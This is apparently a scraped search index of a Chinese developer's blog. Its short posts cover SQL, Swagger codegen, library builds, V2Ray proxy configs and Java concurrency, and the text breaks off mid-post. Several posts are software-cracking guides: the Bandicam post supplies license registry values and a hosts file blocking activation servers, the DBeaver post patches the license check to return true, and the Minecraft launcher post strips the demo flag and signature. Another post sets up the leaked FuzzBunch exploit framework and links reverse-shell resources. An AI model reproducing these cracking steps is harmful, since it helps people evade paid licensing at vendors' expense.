SQL Select https://www.sqlite.org/lang_select.html https://www.postgresql.org/docs/current/queries-table-expressions.html ","permalink":"https://xhstormr.github.io/blog/posts/sql/","summary":"","title":"SQL 必知必会"},{"content":"Updated on 2018-03-02\nhttps://editor.swagger.io/\nhttps://inspector.swagger.io/\n@ curl -LRko swagger-codegen-cli.jar https://jcenter.bintray.com/io/swagger/swagger-codegen-cli/2.3.1/swagger-codegen-cli-2.3.1.jar @ curl -RkO http://petstore.swagger.io/v2/swagger.json @ java -jar swagger-codegen-cli.jar generate ^ -i swagger.json ^ -o client ^ -l java ^ -DapiPackage=com.example.demo.client.api ^ -DmodelPackage=com.example.demo.client.model ^ -DinvokerPackage=com.example.demo.client ^ -Dlibrary=resttemplate ^ -Djava8=true ^ -DdateLibrary=java8 ^ -DhideGenerationTimestamp=true @ java -jar swagger-codegen-cli.jar generate ^ -i swagger.json ^ -o server ^ -l spring ^ -DapiPackage=com.example.demo.api ^ -DmodelPackage=com.example.demo.model ^ -DinvokerPackage=com.example.demo ^ -DconfigPackage=com.example.demo.config ^ -Dlibrary=spring-boot ^ -Djava8=true ^ -DdateLibrary=java8 ^ -DuseOptional=true ^ -DsingleContentTypes=true ^ -DhideGenerationTimestamp=true :: gradlew init --type pom :: 模板: https://github.com/swagger-api/swagger-codegen/tree/master/modules/swagger-codegen/src/main/resources/JavaSpring About JSON JSON 规范： 数据在键值对中。 数据由逗号分隔。 花括号保存对象。 方括号保存数组。 JSON 值： null 数字 布尔值 字符串（双引号 \u0026quot; \u0026quot;） 对象　（花括号 { }） 数组　（方括号 [ ]） JSON 有且仅有 2 种数据结构：对象、数组。 Reference Format： https://jsonhero.io/ http://www.jsonschema2pojo.org/ https://prettier.io/playground/ https://jsonformatter.curiousconcept.com/ https://github.com/tulios/json-viewer Test： https://httpbin.org/ https://docs.postman-echo.com/ https://www.getpostman.com/apps https://www.soapui.org/downloads/latest-release.html ","permalink":"https://xhstormr.github.io/blog/posts/swagger/","summary":"","title":"Swagger API"},{"content":"Updated on 2018-02-18\ngcc\nlibxml2\nStep D:\\Work\\Download\\libxml2-mainline\\win32\u0026gt; https://github.com/GNOME/libxml2/blob/mainline/win32/Makefile.mingw#L334 XML_BASENAME -\u0026gt; XML_NAME cscript configure.js help cscript configure.js compiler=mingw static=yes xml_debug=no legacy=no iconv=no ftp=no http=no html=no modules=no reader=no writer=no walker=no c14n=no catalog=no docb=no mingw32-make -f Makefile.mingw utils ","permalink":"https://xhstormr.github.io/blog/posts/build-libxml2/","summary":"","title":"构建 libxml2"},{"content":"Updated on 2018-03-15\nhttps://sg-dl.bandicam.com/bdcamsetup.exe\nExport export.bat ⇳ @ reg export HKEY_LOCAL_MACHINE\\SOFTWARE\\BandiMPEG1 1.reg /y @ reg export HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\BandiMPEG1 2.reg /y @ reg export HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\BANDISOFT 3.reg /y @ busybox cat 1.reg 2.reg 3.reg \u0026gt; 4.reg @ iconv -f UTF-16 -t UTF-8 4.reg \u0026gt; 5.reg @ busybox sed -i ^ -e \u0026#34;1 a Windows Registry Editor Version 5.00\u0026#34; ^ -e \u0026#34;/^Windows Registry Editor Version 5.00$/d\u0026#34; ^ -e \u0026#34;s/C:\\\\\\\\Program Files (x86)/D:\\\\\\\\Download\\\\\\\\Bandicam/g\u0026#34; ^ 5.reg @ echo [HKEY_CURRENT_USER\\SOFTWARE\\BANDISOFT\\BANDICAM\\OPTION] \u0026gt;\u0026gt; 5.reg @ echo \u0026#34;sOutputFolder\u0026#34;=\u0026#34;D:\\\\Download\\\\Data\u0026#34; \u0026gt;\u0026gt; 5.reg @ busybox uniq 5.reg \u0026gt; 6.reg @ busybox rm -rf 1.reg 2.reg 3.reg 4.reg 5.reg Import import.bat ⇳ @ echo off pushd . cd D:\\Download\\ for /f %%i in (\u0026#39;busybox sh -c \u0026#34;printf \u0026#39;%%x\\n\u0026#39; `date +%%s`\u0026#34;\u0026#39;) do (set n=%%i) busybox sed -i \u0026#34;s/12345678/%n%/\u0026#34; 6.reg reg import 6.reg start Bandicam\\bdcam_nonadmin.exe popd Hosts C:\\Windows\\System32\\drivers\\etc\\hosts ⇳ 0.0.0.0 bandicam.com 0.0.0.0 www.bandicam.com 0.0.0.0 ssl.bandicam.com 0.0.0.0 ssl.bandisoft.com 0.0.0.0 cert.bandicam.com Registry 6.reg ⇳ Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\BandiMPEG1] \u0026#34;ProgramFolder\u0026#34;=\u0026#34;D:\\\\Download\\\\Bandicam\\\\BandiMPEG1\u0026#34; \u0026#34;ProgramPath\u0026#34;=\u0026#34;D:\\\\Download\\\\Bandicam\\\\BandiMPEG1\\\\bdfilters64.dll\u0026#34; [HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\BandiMPEG1] \u0026#34;ProgramFolder\u0026#34;=\u0026#34;D:\\\\Download\\\\Bandicam\\\\BandiMPEG1\u0026#34; \u0026#34;ProgramPath\u0026#34;=\u0026#34;D:\\\\Download\\\\Bandicam\\\\BandiMPEG1\\\\bdfilters.dll\u0026#34; [HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\BANDISOFT] [HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\BANDISOFT\\BANDICAM] \u0026#34;ProgramFolder\u0026#34;=\u0026#34;D:\\\\Download\\\\Bandicam\u0026#34; \u0026#34;ProgramPath\u0026#34;=\u0026#34;D:\\\\Download\\\\Bandicam\\\\bdcam.exe\u0026#34; [HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\BANDISOFT\\BANDICAM\\OPTION] \u0026#34;sCode\u0026#34;=\u0026#34;636ac2272e644cf444313533886c1c90\u0026#34; \u0026#34;sCode2\u0026#34;=\u0026#34;cd0074885897d55c7e611c27ee16fe0ff13545103671943a89af23846b720c18629f979facf655f31c049ddbe7854c16809a03ff748d095c\u0026#34; \u0026#34;sCode3\u0026#34;=\u0026#34;dd86f7ec3e4f90e0f2477c5507aee735\u0026#34; \u0026#34;sUserData\u0026#34;=hex(7):61,00,30,00,61,00,33,00,38,00,62,00,65,00,31,00,37,00,64,00,\\ 32,00,38,00,61,00,64,00,33,00,62,00,36,00,61,00,64,00,64,00,64,00,61,00,62,\\ 00,61,00,37,00,32,00,35,00,36,00,61,00,62,00,31,00,31,00,31,00,35,00,35,00,\\ 30,00,32,00,34,00,37,00,31,00,62,00,63,00,31,00,65,00,64,00,65,00,34,00,61,\\ 00,33,00,64,00,65,00,64,00,35,00,32,00,36,00,62,00,39,00,66,00,39,00,34,00,\\ 30,00,31,00,35,00,37,00,00,00,00,00 \u0026#34;sUserInfo\u0026#34;=hex(7):37,00,39,00,33,00,34,00,31,00,37,00,33,00,61,00,32,00,33,00,\\ 37,00,64,00,39,00,33,00,38,00,32,00,39,00,34,00,32,00,30,00,37,00,37,00,37,\\ 00,62,00,64,00,66,00,64,00,38,00,35,00,38,00,37,00,37,00,30,00,65,00,36,00,\\ 36,00,30,00,61,00,37,00,33,00,38,00,66,00,34,00,34,00,38,00,38,00,36,00,64,\\ 00,66,00,62,00,35,00,31,00,66,00,62,00,61,00,32,00,38,00,37,00,39,00,38,00,\\ 39,00,38,00,38,00,39,00,38,00,64,00,33,00,33,00,30,00,61,00,33,00,32,00,31,\\ 00,63,00,66,00,32,00,32,00,61,00,32,00,33,00,36,00,65,00,39,00,61,00,32,00,\\ 36,00,36,00,65,00,34,00,35,00,35,00,38,00,38,00,31,00,36,00,31,00,64,00,31,\\ 00,31,00,62,00,31,00,34,00,62,00,36,00,31,00,61,00,33,00,62,00,36,00,64,00,\\ 32,00,30,00,00,00,00,00 \u0026#34;tChecked\u0026#34;=dword:12345678 [HKEY_CURRENT_USER\\SOFTWARE\\BANDISOFT\\BANDICAM\\OPTION] \u0026#34;sOutputFolder\u0026#34;=\u0026#34;D:\\\\Download\\\\Data\u0026#34; tChecked ⇳ busybox sh -c \u0026#34;printf \u0026#39;%x\\n\u0026#39; `date +%s`\u0026#34; busybox date +%s busybox date +%c -d @1560135795 ","permalink":"https://xhstormr.github.io/blog/posts/bandicam-portable/","summary":"","title":"Bandicam Portable"},{"content":"Updated on 2018-02-14\ngcc\nlibiconv\nStep D:\\Work\\Download\\libiconv\u0026gt; mkdir build ; cd build ../configure --enable-shared=no --enable-static=yes CFLAGS=\u0026#39;-s -static -Os\u0026#39; \u0026amp;\u0026amp; mingw32-make -j4 ","permalink":"https://xhstormr.github.io/blog/posts/automake-build-libiconv/","summary":"","title":"构建 libiconv"},{"content":"Updated on 2018-01-01\n意识问题的 存在 确定问题的 性质 分析问题的 起因 拟定解决的 方案 实施 与评估方案 ","permalink":"https://xhstormr.github.io/blog/posts/solve-problem/","summary":"","title":"解决问题的步骤"},{"content":"Updated on 2017-12-17\nhttps://sourceforge.net/projects/pywin32/files/pywin32\nhttps://www.python.org/ftp/python/2.6.6/python-2.6.6.msi\nhttps://github.com/fuzzbunch/fuzzbunch/archive/master.zip\nConcept 目标地址：RHOST（Remote Host） 监听地址：LHOST（Listener Host） Step reg import 123.reg pywin32-221.win32-py2.6.exe set PYTHONHOME=D:\\Download\\python set PATH=%PATH%;%PYTHONHOME% set PYTHONPATH=%PYTHONHOME%\\Lib cd fuzzbunch-master md listeningposts python fb.py python start_lp.py 123.reg ⇳ Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\\SOFTWARE\\Python] [HKEY_CURRENT_USER\\SOFTWARE\\Python\\Pythoncore] [HKEY_CURRENT_USER\\SOFTWARE\\Python\\Pythoncore\\2.6] [HKEY_CURRENT_USER\\SOFTWARE\\Python\\Pythoncore\\2.6\\InstallPath] @=\u0026#34;D:\\\\Download\\\\python\u0026#34; [HKEY_CURRENT_USER\\SOFTWARE\\Python\\Pythoncore\\2.6\\PythonPath] @=\u0026#34;D:\\\\Download\\\\python;D:\\\\Download\\\\python\\\\Lib\\\\;D:\\\\Download\\\\python\\\\DLLs\\\\\u0026#34; Reference http://bobao.360.cn/learning/detail/3743.html https://danderspritz.com/ https://github.com/nixawk/labs https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell https://github.com/rapid7/metasploit-payloads/blob/master/java/javapayload ","permalink":"https://xhstormr.github.io/blog/posts/fuzzbunch/","summary":"","title":"FuZZbuNch"},{"content":"Updated on 2018-03-15\nhttps://dbeaver.com/files/dbeaver-ee-latest-win32.win32.x86_64.zip\nStep 反编译 org.jkiss.lm_1.0.17.jar。 搜索 hasProductLicense，定位至 LMLicenseManager.class。 修改方法 hasProductLicense 的返回值为 true。 Code 通过修改字节码： iconst_1 ireturn 通过修改 16 进制代码： 04 AC 03 AC ⬇️ 04 AC 04 AC jar -cfM org.jkiss.lm_1.0.17.jar -C org.jkiss.lm_1.0.17/ . echo hasProductLicense | busybox xxd ","permalink":"https://xhstormr.github.io/blog/posts/reverse-dbeaver/","summary":"","title":"逆向 DBeaver"},{"content":"Updated on 2017-11-29\nhttps://www.v2fly.org/\nhttps://github.com/v2fly/v2ray-core/releases/latest\nhttps://github.com/v2fly/v2fly-github-io/blob/master/docs/config/overview.md\n客户端 socks -\u0026gt; socks { \u0026#34;log\u0026#34;: { \u0026#34;loglevel\u0026#34;: \u0026#34;warning\u0026#34; }, \u0026#34;inbound\u0026#34;: { \u0026#34;port\u0026#34;: 1080, \u0026#34;listen\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;noauth\u0026#34; } }, \u0026#34;outbound\u0026#34;: { \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;servers\u0026#34;: [ { \u0026#34;address\u0026#34;: \u0026#34;219.221.10.50\u0026#34;, \u0026#34;port\u0026#34;: 80, \u0026#34;users\u0026#34;: [ { \u0026#34;user\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;456\u0026#34; } ] } ] } } } socks, http -\u0026gt; vmess { \u0026#34;log\u0026#34;: { \u0026#34;loglevel\u0026#34;: \u0026#34;warning\u0026#34; }, \u0026#34;inbounds\u0026#34;: [ { \u0026#34;port\u0026#34;: 1080, \u0026#34;listen\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34;, \u0026#34;settings\u0026#34;: {} }, { \u0026#34;port\u0026#34;: 1081, \u0026#34;listen\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;http\u0026#34;, \u0026#34;settings\u0026#34;: {} } ], \u0026#34;outbounds\u0026#34;: [ { \u0026#34;protocol\u0026#34;: \u0026#34;vmess\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;vnext\u0026#34;: [ { \u0026#34;address\u0026#34;: \u0026#34;1.1.1.1\u0026#34;, \u0026#34;port\u0026#34;: 8080, \u0026#34;users\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;97b4069c-f116-4612-9e4f-75c2202ec45d\u0026#34; } ] } ] }, \u0026#34;streamSettings\u0026#34;: { \u0026#34;network\u0026#34;: \u0026#34;ws\u0026#34;, \u0026#34;security\u0026#34;: \u0026#34;tls\u0026#34;, \u0026#34;wsSettings\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/8lwwjtbxjl/\u0026#34; }, \u0026#34;tlsSettings\u0026#34;: { \u0026#34;allowInsecure\u0026#34;: true } }, \u0026#34;mux\u0026#34;: { \u0026#34;enabled\u0026#34;: true } }, { \u0026#34;tag\u0026#34;: \u0026#34;direct\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;freedom\u0026#34;, \u0026#34;settings\u0026#34;: {} }, { \u0026#34;tag\u0026#34;: \u0026#34;blocked\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;blackhole\u0026#34;, \u0026#34;settings\u0026#34;: {} } ], \u0026#34;routing\u0026#34;: { \u0026#34;settings\u0026#34;: { \u0026#34;rules\u0026#34;: [ { \u0026#34;outboundTag\u0026#34;: \u0026#34;direct\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;ip\u0026#34;: [ \u0026#34;geoip:cn\u0026#34;, \u0026#34;geoip:private\u0026#34; ] }, { \u0026#34;outboundTag\u0026#34;: \u0026#34;direct\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;domain\u0026#34;: [ \u0026#34;geosite:cn\u0026#34;, \u0026#34;geosite:private\u0026#34; ] }, { \u0026#34;outboundTag\u0026#34;: \u0026#34;blocked\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;domain\u0026#34;: [ \u0026#34;geosite:category-ads-all\u0026#34; ] } ] } } } 服务端 docker-compose.yml version: \u0026#39;3\u0026#39; services: v2ray: image: v2fly/v2fly-core:latest restart: always ports: - \u0026#39;8080:8080\u0026#39; volumes: - ./config.json:/etc/v2ray/config.json:ro - ./tls_key.pem:/root/tls_key.pem:ro - ./tls_cert.pem:/root/tls_cert.pem:ro vmess { \u0026#34;log\u0026#34;: { \u0026#34;loglevel\u0026#34;: \u0026#34;warning\u0026#34; }, \u0026#34;inbounds\u0026#34;: [ { \u0026#34;port\u0026#34;: 8080, \u0026#34;listen\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;vmess\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;clients\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;97b4069c-f116-4612-9e4f-75c2202ec45d\u0026#34; } ] }, \u0026#34;streamSettings\u0026#34;: { \u0026#34;network\u0026#34;: \u0026#34;ws\u0026#34;, \u0026#34;security\u0026#34;: \u0026#34;tls\u0026#34;, \u0026#34;wsSettings\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/8lwwjtbxjl/\u0026#34; }, \u0026#34;tlsSettings\u0026#34;: { \u0026#34;certificates\u0026#34;: [ { \u0026#34;keyFile\u0026#34;: \u0026#34;tls_key.pem\u0026#34;, \u0026#34;certificateFile\u0026#34;: \u0026#34;tls_cert.pem\u0026#34; } ] } } } ], \u0026#34;outbounds\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;direct\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;freedom\u0026#34;, \u0026#34;settings\u0026#34;: {} }, { \u0026#34;tag\u0026#34;: \u0026#34;blocked\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;blackhole\u0026#34;, \u0026#34;settings\u0026#34;: {} } ], \u0026#34;routing\u0026#34;: { \u0026#34;rules\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;ip\u0026#34;: [ \u0026#34;geoip:private\u0026#34; ], \u0026#34;outboundTag\u0026#34;: \u0026#34;blocked\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;domain\u0026#34;: [ \u0026#34;geosite:private\u0026#34; ], \u0026#34;outboundTag\u0026#34;: \u0026#34;blocked\u0026#34; } ] } } socks { \u0026#34;log\u0026#34;: { \u0026#34;loglevel\u0026#34;: \u0026#34;warning\u0026#34; }, \u0026#34;inbound\u0026#34;: { \u0026#34;port\u0026#34;: 8080, \u0026#34;listen\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;accounts\u0026#34;: [ { \u0026#34;user\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;456\u0026#34; } ] } }, \u0026#34;outbound\u0026#34;: { \u0026#34;protocol\u0026#34;: \u0026#34;freedom\u0026#34;, \u0026#34;settings\u0026#34;: {} } } 生成证书： v2ctl cert -ca -file tls -name 123 -org 123 -expire 8760h ","permalink":"https://xhstormr.github.io/blog/posts/v2ray/","summary":"","title":"V2Ray"},{"content":"Updated on 2017-09-21\ngcc\ngit\npython\nbotan\nStep D:\\Work\\Download\\botan-master\u0026gt; python configure.py --cc=gcc --os=mingw --link-method=copy mingw32-make -j8 botan.exe rng 25 Reference cli ","permalink":"https://xhstormr.github.io/blog/posts/make-build-botan/","summary":"","title":"构建 botan"},{"content":"Updated on 2017-09-01\ngcc\ngit\njq\nStep D:\\Work\\Download\u0026gt; git clone --depth 1 --recurse-submodules --shallow-submodules -j2 https://github.com/stedolan/jq.git cd jq ; mkdir build ; cd build autoreconf -fi .. ../configure --with-oniguruma=builtin --enable-shared=no --enable-static=yes CFLAGS=\u0026#39;-s -Os\u0026#39; LDFLAGS=\u0026#39;-static\u0026#39; \u0026amp;\u0026amp; make -j4 Reference 依赖： flex：src | bin bison：src | bin 构建： libtool：src | bin make：src | bin automake：src | bin autoconf：src | bin m4：src | bin 使用：https://www.ibm.com/developerworks/cn/linux/1612_chengg_jq/ ","permalink":"https://xhstormr.github.io/blog/posts/automake-build-jq/","summary":"","title":"构建 jq"},{"content":"Updated on 2017-08-31\ngcc\ncmake\ncmark\nStep D:\\Work\\Download\\cmark-master\u0026gt; type nul \u0026gt; PreLoad.cmake echo set(CMAKE_C_STANDARD 11 CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt; PreLoad.cmake echo set(CMAKE_C_STANDARD_REQUIRED ON CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_C_FLAGS \u0026#34;-s -Os\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_CXX_FLAGS \u0026#34;-s -Os\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_EXE_LINKER_FLAGS \u0026#34;-static\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo. \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_GENERATOR \u0026#34;MinGW Makefiles\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_INSTALL_PREFIX \u0026#34;456\u0026#34; CACHE PATH \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake md 123 \u0026amp;\u0026amp; cd 123 \u0026amp;\u0026amp; cmake .. \u0026amp;\u0026amp; mingw32-make \u0026amp;\u0026amp; mingw32-make install strip -sv -o 123.exe cmark.exe #清除所有标记 objdump -p cmark.exe | more #查看程序信息 ldd cmark.exe #查看动态链接库 Reference MinGW-W64 MinGW Generator CMake Documentation ","permalink":"https://xhstormr.github.io/blog/posts/cmake-build-cmark/","summary":"","title":"构建 cmark"},{"content":"Updated on 2017-08-08\nhttps://s3.amazonaws.com/Minecraft.Download/launcher/launcher.pack\nStep 提取　launcher.jar。 反编译 launcher.jar。 搜索 --demo，定位至 net.minecraft.launcher.game.MinecraftGameRunner.class。 移除 launchGame() 方法中的 --demo 参数。 删除 META-INF 目录中的 MOJANGCS.SF 文件。 清空 META-INF 目录中的 MANIFEST.MF 文件中的多余内容。 Code 7zr.exe x launcher.pack.lzma -y unpack200.exe launcher.pack launcher.jar ldc \u0026#34;--demo\u0026#34; ↓ ldc \u0026#34;\u0026#34; jar -cfM launcher.jar -C launcher/ . java -noverify -jar launcher.jar Reference https://docs.oracle.com/javase/8/docs/technotes/tools/windows/pack200.html https://docs.oracle.com/javase/8/docs/technotes/tools/windows/unpack200.html ","permalink":"https://xhstormr.github.io/blog/posts/reverse-minecraft-launcher/","summary":"","title":"逆向 Minecraft Launcher"},{"content":"Updated on 2017-08-07\nCompletableFuture API\nStream API\nCompletableFuture .supplyAsync(() -\u0026gt; \u0026#34;5\u0026#34;) //有结果工厂方法 .thenApplyAsync(v -\u0026gt; Integer.valueOf(v) + 5) //进行转换 .whenCompleteAsync((v, e) -\u0026gt; System.out.println(\u0026#34;记录: \u0026#34; + v + \u0026#34;, \u0026#34; + e)) //进行记录（peek） .exceptionally(e -\u0026gt; -1) //处理异常 .thenAcceptAsync(v -\u0026gt; System.out.println(v)) //进行消耗 .thenRunAsync(() -\u0026gt; System.out.println(\u0026#34;Done\u0026#34;)); ---- 输出： 记录: 10, null 10 Done 二选二 ------------------------------------------------------- CompletableFuture\u0026lt;Integer\u0026gt; completableFuture = CompletableFuture.completedFuture(5); CompletableFuture .supplyAsync(() -\u0026gt; 5) .thenCombineAsync(completableFuture, (x, y) -\u0026gt; x + y) //应用双方的结果（thenApplyAsync*2） .thenAcceptAsync(v -\u0026gt; System.out.println(v)); ---- 输出： 10 CompletableFuture\u0026lt;Integer\u0026gt; completableFuture = CompletableFuture.completedFuture(5); CompletableFuture .supplyAsync(() -\u0026gt; 5) .thenAcceptBothAsync(completableFuture, (x, y) -\u0026gt; System.out.println(x + y)); //消耗双方的结果（thenAcceptAsync*2） ---- 输出： 10 CompletableFuture\u0026lt;Integer\u0026gt; completableFuture = CompletableFuture.completedFuture(5); CompletableFuture .runAsync(() -\u0026gt; { //无结果工厂方法 try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } }) .runAfterBothAsync(completableFuture, () -\u0026gt; System.out.println(\u0026#34;Done\u0026#34;)); //等待双方执行完毕 ---- 输出： Done 二选一 ------------------------------------------------------- applyToEitherAsync：应用任意一方先执行完毕的结果 acceptEitherAsync：消耗任意一方先执行完毕的结果 runAfterEitherAsync：等待任意一方执行完毕 多选 ------------------------------------------------------- CompletableFuture\u0026lt;Void\u0026gt; voidCompletableFuture = CompletableFuture.allOf(cfs); //等待所有 Future 执行完毕，返回 Void CompletableFuture\u0026lt;Object\u0026gt; objectCompletableFuture = CompletableFuture.anyOf(cfs); //等待任意一方执行完毕，返回其结果 Note： 以 Async 结尾的方法都是异步执行。 thenComposeAsync 类似于 thenApplyAsync，区别在于 Function 的返回值是 CompletionStage。 handleAsync = thenApplyAsync + exceptionally ","permalink":"https://xhstormr.github.io/blog/posts/java-completable-future/","summary":"","title":"Java CompletableFuture"},{"content":"Updated on 2017-08-05\nhttps://docs.oracle.com/javase/10/docs/api/java/util/concurrent | 中文\nConcept 阻塞 -\u0026gt; Unsafe 类 -\u0026gt; park 操作 Code 锁 LockSupport 内部封装了 Unsafe 类的 park 操作。 import java.util.concurrent.TimeUnit; import java.util.concurrent.locks.LockSupport; public class Main { public static void main(String[] args) { Thread a = new Thread(() -\u0026gt; { System.out.println(\u0026#34;a 开始阻塞 5s\u0026#34;); LockSupport.parkUntil(System.currentTimeMillis() + TimeUnit.MILLISECONDS.convert(5, TimeUnit.SECONDS)); 绝对时间 或 LockSupport.parkNanos(TimeUnit.NANOSECONDS.convert(5, TimeUnit.SECONDS)); 相对时间 System.out.println(\u0026#34;a 停止阻塞\u0026#34;); }); Thread b = new Thread(() -\u0026gt; { System.out.println(\u0026#34;b 开始阻塞 无期限\u0026#34;); LockSupport.park(); System.out.println(\u0026#34;b 停止阻塞\u0026#34;); }); Thread c = new Thread(() -\u0026gt; { try { TimeUnit.SECONDS.sleep(2); LockSupport.unpark(b); 线程停止阻塞 } catch (InterruptedException e) { e.printStackTrace(); } }); a.start(); b.start(); c.start(); } } ---- 输出： a 开始阻塞 5s b 开始阻塞 无期限 b 停止阻塞 a 停止阻塞 ReentrantLock 独占锁（排它锁） import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.TimeUnit; import java.util.concurrent.locks.ReentrantLock; public class Main { public static void main(String[] args) { ReentrantLock lock = new ReentrantLock(); ExecutorService executorService = Executors.newCachedThreadPool(); for (int n = 0; n \u0026lt; 2; n++) { executorService.execute(() -\u0026gt; { System.out.println(Thread.currentThread().getName() + \u0026#34; 争夺锁\u0026#34;); lock.lock(); 在 try 块外加锁 try { System.out.println(Thread.currentThread().getName() + \u0026#34; 获得锁\u0026#34;); for (int i = 0; i \u0026lt; 2; i++) { System.out.println(Thread.currentThread().getName() + \u0026#34; 运行中...\u0026#34;); TimeUnit.SECONDS.sleep(1); } } catch (InterruptedException e) { 处理中断异常 e.printStackTrace(); } finally { lock.unlock(); 在 finally 块中解锁 System.out.println(Thread.currentThread().getName() + \u0026#34; 释放锁\u0026#34;); } }); } executorService.shutdown(); } } ---- 输出： pool-1-thread-1 争夺锁 pool-1-thread-2 争夺锁 pool-1-thread-1 获得锁 pool-1-thread-1 运行中... pool-1-thread-1 运行中... pool-1-thread-1 释放锁 pool-1-thread-2 获得锁 pool-1-thread-2 运行中... pool-1-thread-2 运行中... pool-1-thread-2 释放锁 ReentrantReadWriteLock 读写锁 读锁：共享锁，阻塞写锁　，同时只能有 多个读。 写锁：独占锁，阻塞写锁和读锁，同时只能有 一个写。 import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.TimeUnit; import java.util.concurrent.locks.ReentrantReadWriteLock; public class Main { public static void main(String[] args) { ReentrantReadWriteLock lock = new ReentrantReadWriteLock(); ExecutorService executorService = Executors.newCachedThreadPool(); for (int n = 0; n \u0026lt; 2; n++) { executorService.execute(() -\u0026gt; { System.out.println(Thread.currentThread().getName() + \u0026#34; 争夺写锁\u0026#34;); lock.writeLock().lock(); try { System.out.println(Thread.currentThread().getName() + \u0026#34; 获得写锁\u0026#34;); for (int i = 0; i \u0026lt; 2; i++) { System.out.println(Thread.currentThread().getName() + \u0026#34; 运行中...\u0026#34;); TimeUnit.SECONDS.sleep(1); } } catch (InterruptedException e) { e.printStackTrace(); } finally { lock.writeLock().unlock(); System.out.println(Thread.currentThread().getName() + \u0026#34; 释放写锁\u0026#34;); } }); } for (int n = 0; n \u0026lt; 2; n++) { executorService.execute(() -\u0026gt; { System.out.println(Thread.currentThread().getName() + \u0026#34; 争夺读锁\u0026#34;); lock.readLock().lock(); try { System.out.println(Thread.currentThread().getName() + \u0026#34; 获得读锁\u0026#34;); for (int i = 0; i \u0026lt; 2; i++) { System.out.println(Thread.currentThread().getName() + \u0026#34; 运行中...\u0026#34;); TimeUnit.SECONDS.sleep(1); } } catch (InterruptedException e) { e.printStackTrace(); } finally { lock.readLock().unlock(); System.out.println(Thread.currentThread().getName() + \u0026#34; 释放读锁\u0026#34;); } }); } executorService.shutdown(); } } ---- 输出： pool-1-thread-1 争夺写锁 pool-1-thread-2 争夺写锁 pool-1-thread-1 获得写锁 pool-1-thread-1 运行中... pool-1-thread-3 争夺读锁 pool-1-thread-4 争夺读锁 pool-1-thread-1 运行中... pool-1-thread-1 释放写锁 pool-1-thread-2 获得写锁 pool-1-thread-2 运行中... pool-1-thread-2 运行中... pool-1-thread-2 释放写锁 pool-1-thread-3 获得读锁 pool-1-thread-3 运行中... pool-1-thread-4 获得读锁 pool-1-thread-4 运行中... pool-1-thread-3 运行中... pool-1-thread-4 运行中... pool-1-thread-3 释放读锁 pool-1-thread-4 释放读锁 同步器 CountDownLatch 一次性栅栏 import java.util.concurrent.*; public class Main { public static void main(String[] args) { int n = 3; CountDownLatch latch = new CountDownLatch(n); 初始阈值为 3 ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; 5; i++) { executorService.execute(() -\u0026gt; { try { System.out.println(Thread.currentThread().getName() + \u0026#34; 等待中...\u0026#34;); latch.await(); 等待阈值减为 0 